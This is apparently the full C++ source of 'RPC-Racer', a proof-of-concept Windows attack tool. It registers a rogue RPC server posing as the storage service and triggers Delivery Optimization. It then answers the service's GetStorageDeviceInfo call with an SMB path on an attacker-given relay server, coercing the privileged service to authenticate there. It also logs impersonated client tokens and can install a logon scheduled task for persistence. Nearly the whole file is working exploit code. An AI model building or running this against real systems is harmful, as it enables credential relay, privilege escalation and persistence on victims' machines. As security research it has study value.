#include "RPC-Racer.h"

// Use CreateToolhelp32Snapshot to avoid "Access Denied" on high integrity processes
wstring GetProcFileName(DWORD Pid)
{
	wstring path;
	HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == snapshotHandle)
	{
		wcout << L"CreateToolhelp32Snapshot failed " << GetLastError() << endl;
		return path;
	}

	PROCESSENTRY32W entry = {};
	entry.dwSize = sizeof(PROCESSENTRY32W);
	if (!Process32FirstW(snapshotHandle, &entry))
	{
		wcout << L"Process32FirstW failed " << GetLastError() << endl;
		return path;
	}

	do
	{
		if (entry.th32ProcessID == Pid)
		{
			path = entry.szExeFile;
			break;
		}
	} while (Process32NextW(snapshotHandle, &entry));
	CloseHandle(snapshotHandle);
	return path;
}

// Query the binding handle to understand who is the client of the RPC request
void LogCallAttributes(RPC_BINDING_HANDLE BindingHandle)
{
	wstring clientPrincipalName = L"not found";
	wstring clientPid = L"not found";
	wstring clientPath = L"not found";
	wstring serviceName = L"not found";
	wstring opNum = L"not found";
	wstring uuid = L"not found";
	RPC_CALL_ATTRIBUTES_V3_W callAttr = {};
	callAttr.Version = 3;
	callAttr.Flags = RPC_QUERY_CLIENT_PRINCIPAL_NAME | RPC_QUERY_CLIENT_PID;

	// Retrieve the requeired buffer size
	RpcServerInqCallAttributesW(BindingHandle, &callAttr);

	// Allocate the buffer
	if (callAttr.ClientPrincipalNameBufferLength > 0)
		callAttr.ClientPrincipalName = reinterpret_cast<USHORT*>(new BYTE[callAttr.ClientPrincipalNameBufferLength]);

	// Request the data again
	RPC_STATUS status = RpcServerInqCallAttributesW(BindingHandle, &callAttr);
	if (RPC_S_OK == status)
	{
		if (nullptr != callAttr.ClientPrincipalName)
		{
			// Save pricipal name into std::wstring and release heap buffer
			clientPrincipalName = reinterpret_cast<wchar_t*>(callAttr.ClientPrincipalName);
			delete[] callAttr.ClientPrincipalName;
		}
		if (0 != callAttr.ClientPID)
		{
			DWORD dwPid = reinterpret_cast<DWORD>(callAttr.ClientPID);
			clientPid = std::to_wstring(dwPid);
			clientPath = GetProcFileName(dwPid);
			serviceName = GetServiceNameFromPid(dwPid);
		}
		// Log which method of the interface was invoked
		opNum = std::to_wstring(callAttr.OpNum);
		uuid = UuidToWstring(&callAttr.InterfaceUuid);
	}
	else
		cout << "RpcServerInqCallAttributesW failed " << TranslateCode(status) << endl;

	wcout << L"UUID: " << uuid << endl;
	wcout << L"Client Principal Name: " << clientPrincipalName << endl;
	wcout << L"Client PID: " << clientPid << endl;
	wcout << L"Client Path: " << clientPath << endl;
	wcout << L"Service Name: " << serviceName << endl;
	wcout << L"OpNum: " << opNum << endl;
}

// The impersonation level lets us know what the server can do on behalf of the client
wstring GetImpersonationLevel(HANDLE TokenHandle)
{
	wstring impersonationLevel = L"not found";
	SECURITY_IMPERSONATION_LEVEL levelEnum;
	DWORD returnLength = 0;
	if (!GetTokenInformation(TokenHandle, TokenImpersonationLevel, &levelEnum, sizeof(SECURITY_IMPERSONATION_LEVEL), &returnLength))
	{
		// Avoid throwing exception inside security callback and log error instead
		cout << "GetTokenInformation for TokenImpersonationLevel failed " << TranslateCode(GetLastError()) << endl;
		return impersonationLevel;
	}
	switch (levelEnum)
	{
	case SecurityAnonymous:
		impersonationLevel = L"SecurityAnonymous";
		break;
	case SecurityIdentification:
		impersonationLevel = L"SecurityIdentification";
		break;
	case SecurityImpersonation:
		impersonationLevel = L"SecurityImpersonation";
		break;
	case SecurityDelegation:
		impersonationLevel = L"SecurityDelegation";
		break;
	}
	return impersonationLevel;
}

// Impersonate the RPC client to open a handle to its token
HANDLE GetRpcClientToken(RPC_BINDING_HANDLE BindingHandle)
{
	RPC_STATUS status = RpcImpersonateClient(BindingHandle);
	if (RPC_S_OK != status)
	{
		cout << "RpcImpersonateClient failed " << TranslateCode(status) << endl;
		return nullptr;
	}
	HANDLE threadToken = nullptr;
	BOOL success = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &threadToken);
	RpcRevertToSelfEx(BindingHandle);
	if (!success)
	{
		cout << "OpenThreadToken failed " << TranslateCode(GetLastError()) << endl;
		return nullptr;
	}
	return threadToken;
}

// Check which user connected to the server and what are the it's privileges
void LogTokenInfo(RPC_BINDING_HANDLE BindingHandle)
{
	HANDLE threadToken = GetRpcClientToken(BindingHandle);
	if (nullptr == threadToken)
		return;

	wstring impersonationLevel = GetImpersonationLevel(threadToken);
	wcout << L"impersonation level: " << impersonationLevel << endl;
	wstring username;
	wstring sid;
	GetSidAndUsername(threadToken, sid, username);
	wcout << L"client SID: " << sid << endl;
	wcout << L"client username: " << username << endl;
	CloseHandle(threadToken);
}

// Query data about the client from the binding handle
void LogConnectionInfo(RPC_BINDING_HANDLE BindingHandle)
{
	LogCallAttributes(BindingHandle);
	LogTokenInfo(BindingHandle);
}

// The security callback lets us know that a connection was made with the server
RPC_STATUS RpcIfCallbackFn(
	RPC_IF_HANDLE InterfaceUuid,
	void* Context
)
{
	wcout << L"Security callback" << endl;
	RPC_IF_HANDLE bindingHandle = reinterpret_cast<RPC_IF_HANDLE>(Context);
	LogConnectionInfo(bindingHandle);
	return RPC_S_OK;
}

void RegisterServer(RPC_IF_HANDLE Interface, wchar_t* Protseq, wchar_t* Endpoint, wchar_t* Annotation)
{
	// Register the protocol sequence that will be used
	RPC_STATUS rpcStatus = RpcServerUseProtseqEpW(reinterpret_cast<RPC_WSTR>(Protseq), RPC_C_PROTSEQ_MAX_REQS_DEFAULT, reinterpret_cast<RPC_WSTR>(Endpoint), nullptr);
	if (RPC_S_OK != rpcStatus)
		ThrowException("RpcServerUseProtseqEpW failed", rpcStatus);

	// Register the interface that will be used
	rpcStatus = RpcServerRegisterIf2(Interface, nullptr, nullptr, RPC_IF_AUTOLISTEN, RPC_C_LISTEN_MAX_CALLS_DEFAULT, -1, RpcIfCallbackFn);
	if (RPC_S_OK != rpcStatus)
		ThrowException("RpcServerRegisterIf2 failed", rpcStatus);

	// Get the name of the dynamic endpoint that was generated
	RPC_BINDING_VECTOR* pbindingVector = 0;
	rpcStatus = RpcServerInqBindings(&pbindingVector);
	if (RPC_S_OK != rpcStatus)
		ThrowException("RpcServerInqBindings failed", rpcStatus);

	// Register the endpoint to the EPM
	rpcStatus = RpcEpRegisterW(Interface, pbindingVector, nullptr, reinterpret_cast<RPC_WSTR>(Annotation));

	// Print data about the registration of the RPC server
	RPC_SERVER_INTERFACE* serverIf = reinterpret_cast<RPC_SERVER_INTERFACE*>(Interface);
	wstring uuid = UuidToWstring(&serverIf->InterfaceId.SyntaxGUID);
	wcout << L"UUID registered: " << uuid << endl;
	if (pbindingVector->Count > 0)
	{
		wstring endpointBindString = BindHandleToWstring(pbindingVector->BindingH[0]);
		wcout << L"Endpoint registered: " << endpointBindString << endl;
	}
	RpcBindingVectorFree(&pbindingVector);
	if (RPC_S_OK != rpcStatus)
		ThrowException("RpcEpRegisterW failed", rpcStatus);
}

// Delivery Optimization service is a DCOM server
// Invoking IBackgroundCopyJob::CreateJob will cause it to call StorageUsage.dll!GetStorageDeviceInfo and connect to our RPC server
void TriggerCreateJob(LPCWSTR JobName)
{
	HRESULT hr = S_OK;
	hr = CoInitialize(nullptr);
	if (FAILED(hr))
		ThrowException("CoInitialize failed", hr);

	IBackgroundCopyManager* copyManager = nullptr;
	hr = CoCreateInstance(CLSID_DeliveryOptimization,
		nullptr,
		CLSCTX_LOCAL_SERVER,
		IID_IBackgroundCopyManager,
		reinterpret_cast<void**>(&copyManager));

	if (FAILED(hr))
	{
		CoUninitialize();
		ThrowException("CoCreateInstance for IID_IBackgroundCopyManager failed", hr);
	}

	GUID guid = {};
	IBackgroundCopyJob* copyJob = nullptr;
	hr = copyManager->CreateJob(JobName, BG_JOB_TYPE_DOWNLOAD, &guid, &copyJob);
	copyManager->Release();
	if (FAILED(hr))
	{
		CoUninitialize();
		ThrowException("IBackgroundCopyManager::CreateJob failed", hr);
	}
	wcout << L"Job created: " << UuidToWstring(&guid) << endl;
	copyJob->Complete();
	copyJob->Release();
}

// Check if the service is running to understand if the attack was executed too late
void QueryStatusService(const wstring& ServiceName)
{
	SC_HANDLE scHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (nullptr == scHandle)
		ThrowException("OpenSCManager failed", GetLastError());

	SC_HANDLE serviceHandle = OpenServiceW(scHandle, ServiceName.c_str(), SERVICE_QUERY_STATUS);
	if (nullptr == serviceHandle)
	{
		CloseServiceHandle(scHandle);
		ThrowException("OpenServiceW failed", GetLastError());
	}

	SERVICE_STATUS status = {};
	if (!QueryServiceStatus(serviceHandle, &status))
	{
		CloseServiceHandle(serviceHandle);
		CloseServiceHandle(scHandle);
		ThrowException("QueryServiceStatus failed", GetLastError());
	}

	wcout << ServiceName <<L" status: ";
	switch (status.dwCurrentState)
	{
	case SERVICE_STOPPED:
		wcout << L"SERVICE_STOPPED" << endl;
		break;
	case SERVICE_START_PENDING:
		wcout << L"SERVICE_START_PENDING" << endl;
		break;
	case SERVICE_STOP_PENDING:
		wcout << L"SERVICE_STOP_PENDING" << endl;
		break;
	case SERVICE_RUNNING:
		wcout << L"SERVICE_RUNNING" << endl;
		break;
	case SERVICE_CONTINUE_PENDING:
		wcout << L"SERVICE_CONTINUE_PENDING" << endl;
		break;
	case SERVICE_PAUSE_PENDING:
		wcout << L"SERVICE_PAUSE_PENDING" << endl;
		break;
	case SERVICE_PAUSED:
		wcout << L"SERVICE_PAUSED" << endl;
		break;
	}
	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(scHandle);
}

void PrintHelp()
{
	wcout << "usage: RPC-Racer.exe RELAY_SERVER_IP_ADDRESS [" << REGISTER_FLAG << L"]" << endl;
}

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		wstring param1, param2;
		switch (argc)
		{
		case 1:
			PrintHelp();
			return EXIT_SUCCESS;
		case 2:
			param1 = argv[1];
			break;
		default:
			param1 = argv[1];
			param2 = argv[2];
		}

		if (!param1.compare(L"-h") || !param1.compare(L"--help"))
		{
			PrintHelp();
			return EXIT_SUCCESS;
		}

		// The first parameter is the IP address of the relay server
		g_RemoteServer = param1;

		// The second parameter is optinal. It can be given to register a scheduled task that executes when the current user logs on
		if (!param2.empty())
		{
			if (!param2.compare(REGISTER_FLAG))
			{
				RegisterScheduledTask(TASK_NAME, g_RemoteServer, false);
				return EXIT_SUCCESS;
			}
			else
			{
				wcout << L"invalid parameter" << endl;
				PrintHelp();
				return EXIT_SUCCESS;
			}
		}

		wchar_t protseq[] = PROTSEC;
		int interfacesCount = sizeof(INTERFACES) / sizeof(RPC_IF_HANDLE);
		for (int i = 0; i < interfacesCount; i++)
		{
			RegisterServer(INTERFACES[i], protseq, nullptr, nullptr);
		}
		QueryStatusService(ORIGINAL_RPC_SERVICE);
		TriggerCreateJob(L"Job");
		RPC_STATUS rpcStatus = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
		if (RPC_S_OK != rpcStatus)
			ThrowException("RpcServerListen failed", rpcStatus);
	}
	catch (std::exception& ex)
	{
		cout << ex.what() << endl;
	}
	catch (...)
	{
		cout << "Unknown exception occured" << endl;
	}
	cout << "Done" << endl;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}

long SvcMountVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcMountVolume called" << endl; return 0;
}

long SvcDismountVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcDismountVolume called" << endl; return 0;
}

long SvcFormatVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcFormatVolume called" << endl; return 0;
}

long SvcGetStorageInstanceCount(
	/* [in] */ handle_t IDL_handle,
	/* [in] */ STORAGE_DEVICE_TYPE DeviceType,
	/* [out] */ LPDWORD DevicesCount) {
	wcout << L"SvcGetStorageInstanceCount called" << endl;

	// Return specific values that will cause dosvc.dll!CServiceCallback::GetAppInstallPath to call GetStorageDeviceInfo
	*DevicesCount = 1;
	return 0;
}

long SvcGetStorageDeviceInfo(
	/* [in] */ handle_t IDL_handle,
	/* [in] */ STORAGE_DEVICE_TYPE DeviceType,
	/* [in] */ DWORD DeviceIndex,
	/* [out][in] */ STORAGE_DEVICE_INFO* DeviceInfo) {
	wcout << L"SvcGetStorageDeviceInfo called" << endl;

	// Fill the buffer of DeviceInfo with zeros except for the first property - Size
	memset(&DeviceInfo->PathName[0], 0, sizeof(STORAGE_DEVICE_INFO) - sizeof(unsigned int));

	// Write an SMB share to DeviceInfo->PathName
	wstring pathName = L"\\\\";
	pathName.append(g_RemoteServer);
	pathName.append(L"\\Share");
	wcout << L"Setting DeviceInfo->PathName to: " << pathName << endl;
	wcsncpy_s(DeviceInfo->PathName, sizeof(DeviceInfo->PathName) / sizeof(wchar_t), pathName.c_str(), pathName.size());

	// Return specific values to pass the checks made by dosvc.dll!CServiceCallback::GetAppInstallPath
	DeviceInfo->DeviceProperties = STORAGE_PROPERTY_NONE;
	DeviceInfo->PresenceState = STORAGE_PRESENCE_MOUNTED;
	DeviceInfo->VolumeStatus = STORAGE_STATUS_NORMAL;
	return 0;
}

long CleanupItem(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"CleanupItem called" << endl; return 0;
}

long SvcRebootToFlashingMode(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcRebootToFlashingMode called" << endl; return 0;
}

long SvcRebootToUosFlashing(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcRebootToUosFlashing called" << endl; return 0;
}

long SvcFinalizeVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcFinalizeVolume called" << endl; return 0;
}

long SvcGetStorageSettings(
	/* [in] */ handle_t IDL_handle,
	/* [in] */ STORAGE_DEVICE_TYPE DeviceType,
	/* [in] */ DWORD DeviceIndex,
	/* [in] */ STORAGE_SETTING SettingsType,
	/* [out] */ LPDWORD SettingsValue) {
	wcout << L"SvcGetStorageSettings called" << endl;

	// Return specific values that will cause dosvc.dll!CServiceCallback::GetAppInstallPath to call GetStorageDeviceInfo
	*SettingsValue = 0x10;
	return 0;
}

long SvcResetStoragePolicySettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcResetStoragePolicySettings called" << endl; return 0;
}

long SvcSetStorageSettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSetStorageSettings called" << endl; return 0;
}

long SvcTriggerStorageCleanup(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerStorageCleanup called" << endl; return 0;
}

long SvcTriggerLowStorageNotification(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerLowStorageNotification called" << endl; return 0;
}

long SvcMoveFileInheritSecurity(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcMoveFileInheritSecurity called" << endl; return 0;
}

long SvcScanVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcScanVolume called" << endl; return 0;
}

long SvcProcessStorageCardChange(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcProcessStorageCardChange called" << endl; return 0;
}

long SvcProvisionForAppInstall(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcProvisionForAppInstall called" << endl; return 0;
}

long SvcGetStorageInstanceCountForMaps(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageInstanceCountForMaps called" << endl; return 0;
}

long SvcGetStoragePolicySettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStoragePolicySettings called" << endl; return 0;
}

long SvcSetStoragePolicySettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSetStoragePolicySettings called" << endl; return 0;
}

long SvcTriggerStoragePolicies(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerStoragePolicies called" << endl; return 0;
}

long SvcTriggerStorageOptimization(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerStorageOptimization called" << endl; return 0;
}

long SvcPredictStorageHealth(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcPredictStorageHealth called" << endl; return 0;
}

long SvcGetLastFailedSaveLocationPath(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetLastFailedSaveLocationPath called" << endl; return 0;
}

long SvcExecuteRemoveUserFiles(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcExecuteRemoveUserFiles called" << endl; return 0;
}

long SvcExecuteDehydrateUserFiles(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcExecuteDehydrateUserFiles called" << endl; return 0;
}

long SvcGetStorageDeviceSize(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageDeviceSize called" << endl; return 0;
}

long SvcGetStoragePolicyDefaultValue(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStoragePolicyDefaultValue called" << endl; return 0;
}

long SvcGetStorageDeviceLowDiskState(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageDeviceLowDiskState called" << endl; return 0;
}

long SvcGetStorageDeviceLowDiskState2(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageDeviceLowDiskState2 called" << endl; return 0;
}

long SvcSilentCleanupTaskSetEnabledState(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSilentCleanupTaskSetEnabledState called" << endl; return 0;
}

long SvcSilentCleanupTaskGetEnabledState(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSilentCleanupTaskGetEnabledState called" << endl; return 0;
}

long SvcGetStoragePoliciesLastTriggerTime(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStoragePoliciesLastTriggerTime called" << endl; return 0;
}

long SvcSetStoragePoliciesLastTriggerTime(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSetStoragePoliciesLastTriggerTime called" << endl; return 0;
}

long SvcGetSmartAttributes(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetSmartAttributes called" << endl; return 0;
}